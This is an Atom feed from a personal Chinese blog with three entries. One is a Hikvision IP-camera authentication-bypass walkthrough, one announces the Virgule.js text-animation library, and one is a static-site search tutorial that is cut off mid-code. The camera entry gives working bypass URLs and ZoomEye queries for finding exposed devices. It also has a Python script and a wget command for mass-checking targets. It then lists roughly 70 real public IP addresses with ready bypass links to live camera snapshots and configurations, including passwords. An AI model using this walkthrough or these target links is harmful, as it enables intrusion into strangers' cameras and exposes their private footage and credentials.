<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://ravelloh.top/</id>
    <title>RavelloH's Blog / RavelloH的博客</title>
    <updated>2023-08-12T15:24:59.558Z</updated>
    <generator>https://github.com/RavelloH/local-feed-generation</generator>
    <author>
        <name>RavelloH</name>
        <email>ravelloh@outlook.com</email>
        <uri>https://ravelloh.top/</uri>
    </author>
    <link rel="alternate" href="http://ravelloh.top/"/>
    <link rel="self" href="https://ravelloh.top/feed/atom.xml"/>
    <subtitle>RSS - 博客文章订阅更新</subtitle>
    <logo>https://ravelloh.top/assets/images/avatar.jpg</logo>
    <icon>https://ravelloh.top/favicon.ico</icon>
    <rights>Copyright © 2019 - 2023 RavelloH. All rights reserved.</rights>
    <entry>
        <title type="html"><![CDATA[HikvisionIP摄像头后台绕过]]></title>
        <id>/articles/20221224/</id>
        <link href="https://ravelloh.top/articles/20221224/"/>
        <updated>2022-12-24T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 注:此漏洞已于2017年被修复。本文仅作为学习用途。 起因 最近在学校用Kali扫内网ms17-010的时候，发现扫了一大堆主机居然只扫出来两个，而且在攻击时发现的确没用。 诚然，永恒之蓝作为2017年的漏洞，早已在当时被紧急修复，五年过去依旧存在这个漏洞的Windows7设备已经寥寥无几了。但是在用nmap扫描时，我发现学校内有 Hikvision IP camera设备，大概都是2016年装上的，于是回家一查，果然存在一个后台绕过漏洞。 但是不巧的是，因为疫情封校还没法回去实践，于是在这里应用一下，看看公网上还有多少设备存在这漏洞。 漏洞介绍 // 摘抄自 packetstormsecurity Hikvision camera API includes support for proprietary HikCGI protocol, which exposes URI endpoints through the camera's web interface. The HikCGI protocol handler checks for the presence of a parameter named "auth" in the query string and if that parameter contains a base64-encoded "username:password" string, the HikCGI API call assumes the idntity of the specified user. The password is ignored. Virtually all Hikvision products come with a superuser account named "admin", which can be easily impersonated. 也就是说我们可以直接通过在链接后加入 "?auth="+[base64编码的用户名:密码]的形式轻松绕过。这个 [base64编码的用户名:密码]仅需要用户名对应，密码是什么无所谓，所以我们可以直接随便加密一个： admin:11 ↓base64↓ YWRtaW46MTEK 也就是说，我们在需要权限的页面url上直接加入?auth=YWRtaW46MTEK就能绕过验证。这些url包括: // 获取用户列表 http://camera.ip:port/Security/users?auth=YWRtaW46MTEK // 获取快照 http://camera.ip:port/onvif-http/snapshot?auth=YWRtaW46MTEK // 获得摄像头配置 http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK 从结果上来看，获取用户列表的结果是这样的： <?xml version="1.0" encoding="UTF-8"?> <UserList version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema"> <User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema"> <id>1</id> <userName>admin</userName> <priority>high</priority> <ipAddress>0.0.0.0</ipAddress> <macAddress>00:00:00:00:00:00</macAddress> <userLevel>Administrator</userLevel> </User> </UserList> 获取快照则会得到当前截图： 而获得配置则会直接得到一份当前摄像头的配置情况，包括账号密码。 值得注意的是，这里的配置其实也简单加密了一下，实际上的密钥似乎是abcdefg，不过这不难解决，在github上就有相关的解密工具。 Github@WormChickenWizard/hikvision-decrypter 解密前它是一个二进制文件，解密后它同样也是一个二进制文件，不过解密后可以直接用Hex编辑器搜索 admin，密码就在它的下两行。 实践 获得目标 这里借助zoomeye的命令行插件请求，方便后续的数据导出。(网页版zoomeye导出数据需会员) 可自Github下载: Github@knownsec/ZoomEye-python 首先需要配置这个命令行工具，这里略，因为在Github仓库内有详细的中文文档说明。仅需填入API key即可。 之后我们就可以使用这个搜索了，例子如下: zoomeye search 'iconhash: "89b932fcc47cf4ca3faadb0cfdef89cf" +2016 +country:"CN" +after:"2021-12-22" +app:"Hikvision IP camera httpd"' -num 20 正确执行后，输出应该类似这样： 解析一下以上搜索的命令: 网站图标 - 'iconhash: "89b932fcc47cf4ca3faadb0cfdef89cf" (Hikvision监控页面图标) 监控年份 - 2016 (此漏洞2017得到修复，我们往前推一年，成功率比较大) 索引国家 - country:"CN" (自家兄弟，速度快) 索引时间 - after:"2021-12-22" (索引最近一年的数据) 索引类型 - app:"Hikvision IP camera httpd" (只索引这个IP摄像头) 查找数量 - -num 20 (测试用，仅查找20个，悠着点用，免费版每个月只有10000次) 这就八九不离十了，如果需要更进一步还可以加上额外选项，如city:"shanghai"等等，详见zoomeye官网。 接下来就是导出，因为工具本来就有-save选项，十分简单 zoomeye search 'iconhash: "89b932fcc47cf4ca3faadb0cfdef89cf" +2016 +country:"CN" +after:"2021-12-22" +app:"Hikvision IP camera httpd"' -num 1000 -save port 这里唯一增加的选项是 -save port，表示额外存储端口(默认必存IP)，另外将数量至1000，有需要也可以设置多一些。 不过因为导出是每次请求20个结果的缘故需要时间，等待导出即可。 导出的结果如下: {'ip': '221.0.16.166', 'port': 8808} {'ip': '60.216.142.12', 'port': 8808} {'ip': '27.211.181.181', 'port': 8808} {'ip': '61.132.107.234', 'port': 32400} {'ip': '111.23.146.92', 'port': 32400} {'ip': '113.234.39.166', 'port': 995} {'ip': '112.232.246.135', 'port': 8808} {'ip': '112.232.247.90', 'port': 8808} {'ip': '39.71.193.248', 'port': 8808} {'ip': '39.71.192.8', 'port': 8808} {'ip': '114.33.140.212', 'port': 8883} {'ip': '137.189.185.154', 'port': 8005} {'ip': '182.135.224.187', 'port': 8005} {'ip': '112.240.5.75', 'port': 8005} {'ip': '1.65.200.1', 'port': 8883} {'ip': '114.246.201.88', 'port': 88} {'ip': '114.246.216.66', 'port': 88} {'ip': '119.145.77.202', 'port': 88} {'ip': '182.84.45.51', 'port': 88} {'ip': '122.247.197.186', 'port': 88} {'ip': '122.244.52.251', 'port': 88} {'ip': '122.240.1.130', 'port': 88} {'ip': '122.245.80.91', 'port': 88} {'ip': '122.240.204.77', 'port': 88} ...... 格式重组 接下来就是去验证每个IP是否有效。 我这里是采用获取快照的方式，可以方便的用wget的--spider模式确认是否能访问到快照。 那么就需要先去得到有效的url，在上面zoomeye导出的时候会生成一个json，我们在这里可以直接每行解析一下，将完成结果写入到另一个文件中。 # python 3 # -*- coding: utf-8 -*- import os import time from datetime import datetime import json urls0 = 'https://' urls1 = 'http://' urls3 = '/onvif-http/snapshot?auth=YWRtaW46MTEK' # 初始化 startTime = time.localtime() startDateTime = datetime.now() print('[初始化进程运行] - '+time.strftime("%H:%M:%S",time.localtime())) if 'targets.json' in os.listdir('.'): with open(r'./targets.json','r') as fp: l1 = fp.readlines() print(f' 检测到目标，共载入{len(l1)}个数据') else: print('[Error]未检测到targets.json，无目标') exit() print('[主进程运行]') for i in range(len(l1)): jsons = json.loads(str(l1[i]).replace('\n','').replace('\'','"')) url2 = str(jsons['ip'])+':'+str(jsons['port']) with open(r'./ok.info','a') as f2: f2.write(urls1+url2+urls3+'\n') print('\r'+time.strftime("%H:%M:%S",time.localtime())+'» 总进度:['+'|'*(i//(len(l1)//50)+1)+' '*(50-(i//(len(l1)//50))-1)+']'+str(i)+'/'+str(len(l1))+' - '+str(round(float((i/len(l1)))*100,2))+'%') 上面这个python小程序会把它所在文件夹内的 targets.json中的全部ip转换为url形式存储在 result.txt中，每行一个： http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://60.216.142.12:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://27.211.181.181:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://61.132.107.234:32400/onvif-http/snapshot?auth=YWRtaW46MTEK http://111.23.146.92:32400/onvif-http/snapshot?auth=YWRtaW46MTEK http://113.234.39.166:995/onvif-http/snapshot?auth=YWRtaW46MTEK http://112.232.246.135:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://112.232.247.90:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://39.71.193.248:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://39.71.192.8:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.33.140.212:8883/onvif-http/snapshot?auth=YWRtaW46MTEK http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK http://182.135.224.187:8005/onvif-http/snapshot?auth=YWRtaW46MTEK http://112.240.5.75:8005/onvif-http/snapshot?auth=YWRtaW46MTEK http://1.65.200.1:8883/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.246.201.88:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://119.145.77.202:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://182.84.45.51:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://122.247.197.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://122.244.52.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://122.240.1.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://122.245.80.91:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://122.240.204.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK ...... 这样的格式就让我们看起来很舒服了，接下来就可以用wget去逐一验证: 验证目标 wget --tries 1 --timeout 1 -nv -o data.log --spider -i result.txt 此操作将静默进行，结果会用wget的简洁模式存储在data.log中，方便我们检索。 上面设置的超时时间与超时重试次数都是1，耗时较短，如果有耐心可以设置大一点。 完成后，data.log中的结果应该如下: failed: Connection timed out. 2022-12-23 18:05:11 URL: http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK 200 OK failed: Connection timed out. Username/Password Authentication Failed. failed: Connection timed out. failed: Connection timed out. Read error (Connection timed out) in headers. failed: Connection timed out. Username/Password Authentication Failed. failed: Connection timed out. failed: Connection timed out. failed: Connection timed out. Username/Password Authentication Failed. failed: Connection timed out. failed: Connection refused. 2022-12-23 18:05:36 URL: http://27.223.48.100:88/onvif-http/snapshot?auth=YWRtaW46MTEK 200 OK failed: Connection timed out. failed: Connection refused. failed: Connection timed out. failed: Connection refused. failed: Connection refused. Username/Password Authentication Failed. 2022-12-23 18:05:39 URL: http://221.215.171.198:81/onvif-http/snapshot?auth=YWRtaW46MTEK 200 OK failed: Connection refused. ...... 可以看到，能成功访问的url都有200标识，逐一解释一下其余的: failed: Connection timed out. - 无法连接 Read error (Connection timed out) in headers. - 无法连接 failed: Connection refused. - 可以连接，但不存在此漏洞 Username/Password Authentication Failed. - 存在此漏洞，但默认用户名不是admin 为了方便我们进一步处理，用正则表达式替换以下字符为空: // 以下不需要使用正则表达式 Username/Password Authentication Failed. failed: Connection timed out. failed: Connection refused. Read error (Connection timed out) in headers. Remote file does not exist -- broken link!!! 200 OK // 以下需要使用正则表达式 ^.*:$ // 去除坏链 [0-9]*-[0-9]*-[0-9]* [0-9]*:[0-9]*:[0-9]* URL: //去除时间 [ \t\n]*$ //去除空行&空格 不出意外的话，最后留下的就是存在漏洞的链接了。 我这里试了一下，1000个ip中大概有70个存在此漏洞，也就是7%吧 附最终结果： http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://27.211.181.181:8808/onvif-http/snapshot?auth=YWRtaW46MTEK http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://116.132.38.26:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://61.155.60.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://111.17.186.222:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://60.211.176.138:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://139.170.232.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://60.29.192.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://218.17.121.235:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://222.135.125.233:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://120.211.63.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://120.236.75.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://115.238.136.42:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://27.9.47.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://220.132.146.242:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://110.167.76.104:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://112.16.175.58:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://222.184.120.162:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://119.120.224.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://180.161.47.184:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://180.161.91.12:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://211.140.148.199:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://211.143.231.238:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://223.68.200.14:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.218.22.55:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://59.173.49.211:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://119.1.107.250:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://27.200.21.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://27.196.174.10:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://103.100.64.75:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://180.158.150.171:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://218.203.76.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://117.86.108.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://116.232.75.214:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://116.230.31.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://125.123.232.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.214.115.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://101.74.233.94:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://180.165.218.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.88.37.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.95.248.231:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://220.178.172.134:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://220.180.211.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://124.77.94.21:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.233.4.106:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://114.231.243.80:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://125.90.3.102:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://125.95.237.71:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://14.120.74.123:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://223.82.14.139:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://223.82.36.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://116.11.185.163:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.250.109.133:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.250.246.173:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.247.200.105:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.248.215.239:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.196.178.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://115.171.0.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.233.250.61:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.238.201.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://111.194.239.146:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://61.131.71.114:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://218.94.67.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://218.88.5.67:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://183.63.221.22:88/onvif-http/snapshot?auth=YWRtaW46MTEK http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK ...... 也可以选择在show.html查看可用度。 其余如何利用漏洞的环节不再赘述，不要用于非法用途。 后言 上述就是对2017年 HikvisionIP摄像头后台绕过漏洞的应用， 终。 ]]></content>
        <category/>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Virgule.js现已发布]]></title>
        <id>/articles/20221126/</id>
        <link href="https://ravelloh.top/articles/20221126/"/>
        <updated>2022-11-26T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 前言 22年暑假时，我把博客首页的打字机特效换成了类似于现在这种，但是当时也是随便做出来玩玩的，不仅功能单一，结构臃肿，用了530行js也只能达到让主页有两句循环的轮播，实在太不优雅。 今年十月初我决定重制这个功能将其从530行压缩到370行，并在原有的基础上加入了跳过空格、自定义速度、快捷引用目标等功能，并将其封装为函数，现在想要使用只需一句： virgule(target,context,speed) 太优雅了。 项目现已开源。@Github:RavelloH/virgule.js 效果 升级前后对比 升级前 升级后 即时体验 运行 上方左侧填入替换内容，右侧设置速度... 使用 直接引入JavaScript脚本 <script src="https://ravelloh.github.io/virgule.js/virgule.js"></script> 手动复制源代码 // Author:RavelloH // LICENCE: MIT // Repo src: github.com/RavelloH/virgule.js randArrMin = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]; randArr = ["あ","ぃ","い","ぅ","う","ぇ","え","ぉ","お","か","が","き","ぎ","く","ぐ","け","げ","こ","ご","さ","ざ","し","じ","す","ず","せ","ぜ","そ","ぞ","た","だ","ち","ぢ","っ","つ","づ","て","で","と","ど","な","に","ぬ","ね","の","は","ば","ぱ","ひ","び","ぴ","ふ","ぶ","ぷ","へ","べ","ぺ","ほ","ぼ","ぽ","ま","み","む","め","も","ゃ","や","ゅ","ゆ","ょ","よ","ら","り","る","れ","ろ","ゎ","わ","ゐ","ゑ","を","ん","ゔ","ゕ","ゖ","ァ","ア","ィ","イ","ゥ","ウ","ェ","エ","ォ","オ","カ","ガ","キ","ギ","ク","グ","ケ","ゲ","コ","ゴ","サ","ザ","シ","ジ","ス","ズ","セ","ゼ","ソ","ゾ","タ","ダ","チ","ヂ","ッ","ツ","ヅ","テ","デ","ト","ド","ナ","ニ","ヌ","ネ","ノ","ハ","バ","パ","ヒ","ビ","ピ","フ","ブ","プ","ヘ","ベ","ペ","ホ","ボ","ポ","マ","ミ","ム","メ","モ","ャ","ヤ","ュ","ユ","ョ","ヨ","ラ","リ","ル","レ","ロ","ヮ","ワ","ヰ","ヱ","ヲ","ン","ヴ","ヵ","ヶ","ヷ","ヸ","ヹ","ヺ","ー","ヾ","ㄅ","ㄆ","ㄇ","ㄈ","ㄉ","ㄊ","ㄋ","ㄌ","ㄍ","ㄎ","ㄏ","ㄐ","ㄑ","ㄒ","ㄓ","ㄔ","ㄕ","ㄖ","ㄗ","ㄘ","ㄙ","ㄝ","ㄞ","ㄟ","ㄠ","ㄡ","ㄢ","ㄣ","ㄤ","ㄥ","ㄦ","ㄧ","ㄨ","ㄩ","〇","口","甲","乙","丙","丁","戊","己","庚","辛","壬","癸",]; function virgule(target, context, speed = 100) { //context重组 contextArr = []; for (var i = 0; i < context.length; i++) { contextArr.push(context[i]) } // 添加/ target.innerHTML = ""; numVirgule = 0 var virgulegenerate = setInterval( function() { // 字符划分 if (escape(contextArr[numVirgule]).indexOf("%u") < 0) { if (contextArr[numVirgule] == ' ') { target.innerHTML += ' ' } else { target.innerHTML += '/' } } else { target.innerHTML += '//' } numVirgule += 1 if (numVirgule > context.length) { clearInterval(virgulegenerate); target.innerHTML = target.innerHTML.slice(0, target.innerHTML.length-1) setTimeout(function() { textIn()}, 100) } }, 1000/speed) // 文字进入 numIn = 0; numCharacter = 0; function textIn() { originText = target.innerHTML; var virgulereplace = setInterval( function() { numIn += 1 if (numIn >= contextArr.length) { clearInterval(virgulereplace) textwrite() } cacheText = '' numCharacter = 0 for (i = 0; i < numIn; i++) { if (escape(contextArr[i]).indexOf("%u") < 0) { if (contextArr[i] == ' ') { cacheText += ' ' numCharacter += 1 } else { //单字符 var rand = Math.floor(Math.random() * randArrMin.length); cacheText += randArrMin[rand] numCharacter += 1 } } else { // 双字符 var rand = Math.floor(Math.random() * randArr.length); cacheText += randArr[rand] numCharacter += 2 } } target.innerHTML = cacheText + originText.slice(numCharacter, originText.length) }, 2000/speed) // 原始文字写入 numWrite = 0 function textwrite() { originText = target.innerHTML; var virgulewrite = setInterval( function() { numWrite += 1 if (numWrite >= contextArr.length) { clearInterval(virgulewrite) } cacheText = '' numCharacter = 0 for (i = 0; i < numIn; i++) { if (escape(contextArr[i]).indexOf("%u") < 0) { if (contextArr[i] == ' ') { cacheText += ' ' numCharacter += 1 } else { //单字符 var rand = Math.floor(Math.random() * randArrMin.length); cacheText += randArrMin[rand] numCharacter += 1 } } else { // 双字符 var rand = Math.floor(Math.random() * randArr.length); cacheText += randArr[rand] numCharacter += 2 } } target.innerHTML = context.slice(0, numWrite) + cacheText.slice(numWrite, cacheText.length) + originText.slice(numCharacter, originText.length) }, 2000/speed) } } } 用以上任意一种方法，获取到JS即可。接下来就是如何使用，也十分方便： virgule(target,context,speed) //target context必填，speed可选填，默认100 //example: virgule(document.getElementById('jumping'), 'Place the text you want as the result here',100) //对文档中一个id为jumping的元素使用virgule效果，目标文字是"Place the text you want as the result here"，速度为100 需要注意的是，此项目需搭配等宽字体使用，如自带的Courier New、Terminal等，或者自己引入其他等宽字体。 这里推荐Microsoft Yahei Mono和SF Mono SC。 实现方法 注:下方行数表示以上Js代码所处行数。 4-5：定义了两个列表randArrMin以及randArr，前者用于一个英文字符宽的字符的替换，后者用于一个中文字符宽的替换。 7：定义了virgule的主函数，默认参数中targetcontext必填，speed选填，默认100。 8-12：将context中的内容转换到contextArr中储存。 14-15：重置目标 16-36：创建延迟循环virgulegenerate，间隔1000/speed毫秒。 18-28：判断中英文，中文插入两个/，英文插入一个/，空格插入空格。 29-34：判断何时结束斜杠的插入动作，延迟100ms唤起textIn() 39-40：重置变量 41-109：textIn()主函数，用于将生成的斜杠替换为context文字。 43：创建定时器virgulereplace，间隔2000/speed毫秒 46-49：终止器，用于在此环节结束后呼出下一个操作函数textWrite() 52-69：二次递归循环，用于按上一级循环进行量将对应数量斜杠替换为随机文字，同样分双字符、单字符、空格三种情况。 70：对应写入，切分随机字符组与斜杠字符组，保证总长度不变。 16-108：textIn()函数下的二级函数textWrite()，用于在将target中所有字符替换为随机字符后，继续将随机字符替换为context() 79-83：在所有过程结束后终止定时器 86-103：同52-69，将contextArr中内容逐个添加进去。 104：重组字符串，酱三个列表中的内容整合写入target中。 关键分析 其实整个过程中最复杂的是三个插入过程的顺序。这简单来说，分为以下三个阶段： 1.用斜杠覆盖文本。 2.逐渐将斜杠替换为随机文字。这一过程中，每将一个斜杠组替换一个新字符，就会重新将它前面的随机字符再随机化。 3.用target中的文字替换随机文字。这一过程大体与2相反，没将一个随机字符替换为目标字符，就会刷新其后的随机字符。 以上三个过程顺次进行，每个过程完成后唤起下一个过程。如果还不理解，可以在#效果章节的在线体验中，选择较低的速度运行，以理解这三个过程。 后言 上述就是virgule.js现有的功能介绍和使用方法，顺带着也写了大体的实现方法。 本来打算把virgule效果应用给整个博客的，但碍于实在找不到什么地方再去添加，先鸽了。 ]]></content>
        <category/>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[静态站实现全站搜索]]></title>
        <id>/articles/20220825/</id>
        <link href="https://ravelloh.top/articles/20220825/"/>
        <updated>2022-08-25T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 前言 全站搜索这一功能我想加入到我的博客中不是一年两年的事了。但因自己现在弃用Hexo转而自己做博客，这两年搜索这个功能就一直未能实现。 最近自己偶然有新想法，就给实现了。效果还不错，现在搭配Github Actions使用，可以实现新文章自动索引，实现了自动化。 效果 搜索示例 要想充分体验，还是自己去试试的好。转到Articles索引页 实现方式 数据生成 要想在静态页搜索，就要自己创建索引。这里使用python来创建一个JSON，存储全站文章信息： # -*- coding: utf-8 -*- ## 使用有问题请到github.com/ravelloh/RPageSearch提ISSUE ### Author: RavelloH #### LICENCE: MIT ##### RPageSearch import os from bs4 import BeautifulSoup ## 设置目标 target = './articles/' # 目录位置 layers = 1 # 遍历层数 targettype = 'html' # 文件后缀名(只支持html) main_structure_head='{"articles":[' main_structure_end=']}' inner_structure_1='{"title":"' inner_structure_2='","path":"' inner_structure_3='","time":"' inner_structure_4='","text":"' inner_structure_5='"}' ## 打开目标目录 targetfile = [] for i in os.listdir(target): if '.' not in i: for k in os.listdir(target +i): if targettype in k: targetfile.append(target + i + '/' + k) ## 按时间顺序排序 targetfilenum = [] for i in targetfile: targetfilenum.append(i[11:19]) targetfilenum.sort(reverse=True) targetfile=[] for i in targetfilenum: targetfile.append('./articles/'+str(i)+'/index.html') ## 解析重构目标文件 inner_structure_cache=[] inner_structure_text='' for i in targetfile: inner_structure_text = '' with open(i,'r') as f: filecontent = BeautifulSoup(f.read(),'html.parser') textlist = filecontent.find_all(name='p') title = filecontent.find_all(name='h2') titlelen=len(title) length = len(textlist) for j in range(length): inner_structure_text=inner_structure_text+textlist[j].get_text() time = i[-19:-11] time = time[0:4]+'-'+time[4:6]+'-'+time[6:8] title = title[titlelen-1] path = i[1:][:-10] inner_structure_text=inner_structure_text.replace(' ','').replace('\n','').replace('"','"').replace('\\','') inner_structure_all = inner_structure_1 + str(title.get_text()) + inner_structure_2 + str(path) + inner_structure_3 + str(time) + inner_structure_4 + inner_structure_text + inner_structure_5 inner_structure_cache.append(inner_structure_all) ## 重构完整JSON main_structure = main_structure_head for i in inner_structure_cache: main_structure = main_structure + i + ',' main_structure = main_structure[:-1] + main_structure_end total_str = 'var SearchResult = "' + main_structure.replace('"','\\"') + '"' print(total_str) # 写入JSON#文件 with open('./js/searchdata.js','w+') as #1: f1.write(total_str) 上述代码实现了将articles目录下所有文件夹中以.html后缀结尾的文件中的p标签中文字提取出来，并顺便提取h2的文章标题。不过因为python中直接使用os.dirlist扫出的文件名是乱序，为方便后续排序还需要按照时间顺序排序，其中因为我的文章存储方式是以时间排序的，如这篇文章的存储结构就是/articles/20220825/inxex.html，因为时间可以直接从文件夹中读出，时间排序比较方便，7行就搞定了，如果是其余方式也同理。上述代码运行后，得出的应该是类似于如下结构的json: { "articles":[{ "title":"文章标题","path":"相对路径","time":"更新时间","text":"所有正文" }, { "title":"文章标题","path":"相对路径","time":"更新时间","text":"所有正文" }, { "title":"文章标题","path":"相对路径","time":"更新时间","text":"所有正文" }] } 这样全站搜索的json就生成完成了，为了方便引用，上述代码最后会将这个json改为js格式，并转义"字符。 这样，就可以在后续处理搜索时直接引用js，其中json存储在变量SearchResult中。 搜索处理 有了json，搜索就只需在前端实现了。这样可以脱离服务器的限制，唯一限制速度的是访客的设备性能。 但因为这里只是简单的字符串搜索，性能需求并不大，下面我写的代码虽说并没有做到极限优化，但也通过多层次搜索降低了一部分运算量，可以做到实时搜索输入数据。 以下是HTML与JavaScript代码。当然，这跟我博客上的不一样，博客上还加入了一些css过渡之类的，不过本篇重点也不是css，如果有需求可自行到博客articles页F12看看。博客源代码在github，见此。 <div class='searchbox'></span> <form class="searchbox" onSubmit="return check();" autocomplete="off"> <input type="text" placeholder="从所有文章内检索..." name="search" oninput="searchtext()" onpropertychange="searchtext()"> <button type="button" id='searchbutton'><span class="i_mini ri:search-line"></span></button> <div class="resultlist" id="resultlist"> <i>- 搜索 -</i><hr><p align="center"> 输入关键词以在文章标题及正文中查询 </p> <hr><a href="https://github.com/ravelloh/RPageSearch">Search powered by RavelloH's RPageSearch</a> </div> </form> </div> let input = document.querySelector("input[type='text']"); let result = document.getElementById('resultlist') let button = document.getElementById('searchbutton') obj = JSON.parse(SearchResult); function searchtext() { result.innerHTML = input.value; if (input.value == '') { result.innerHTML = '<i>- 搜索 -</i><hr>'+'<p align="center">输入关键词以在文章标题及正文中查询</p><hr>' } // 标题搜索 resultcount = 0; resultstr = ''; var resulttitlecache = new Array() for (i = 0; i < obj.articles.length; i++) { if (obj.articles[i]['title'].includes(input.value) == true) { resulttitlecache.unshift(obj.articles[i]['title']) resultcount++; } } // 标题搜索结果展示 if (resultcount !== 0 && resultcount !== obj.articles.length) { for (i = 0; i < resulttitlecache.length; i++) { for (j = 0; j < obj.articles.length; j++) { if (obj.articles[j]['title'] == resulttitlecache[i]) { titlesearchresult = '<h4><a href="'+obj.articles[j]["path"]+'" class="resulttitle">'+obj.articles[j]['title'].replace(new RegExp(input.value, 'g'), '<mark>'+input.value+'</mark>')+'</a></h4><em>-标题匹配</em><p class="showbox">'+obj.articles[j]['text'].substring(0, 100)+'</p>' resultstr = titlesearchresult + '<hr>' + resultstr } } result.innerHTML = '<i>"'+input.value+'"</i><hr>'+resultstr; } } // 正文搜索 var resulttextcache = new Array() for (i = 0; i < obj.articles.length; i++) { if (obj.articles[i]['text'].includes(input.value) == true) { resulttextcache.unshift(obj.articles[i]['text']) resultcount++; } } // 正文搜索结果计数 var targetname = new Array() var targetscore = new Array() if (resulttextcache.length !== 0 && input.value !== '') { for (i = 0; i < resulttextcache.length; i++) { for (j = 0; j < obj.articles.length; j++) { if (obj.articles[j]['text'] == resulttextcache[i]) { targetname.unshift(obj.articles[j]['title']) targetscore.unshift(obj.articles[j]['text'].match(RegExp(input.value, 'gim')).length) } } } } //排序相关选项 var targetscorecache = targetscore.concat([]); var resultfortext = ''; var textsearchresult = '' targetscorecache.sort(function(a, b) { return b-a }) for (i = 0; i < targetscorecache.length; i++) { for (j = 0; j < targetscore.length; j++) { if (targetscorecache[i] == targetscore[j]) { 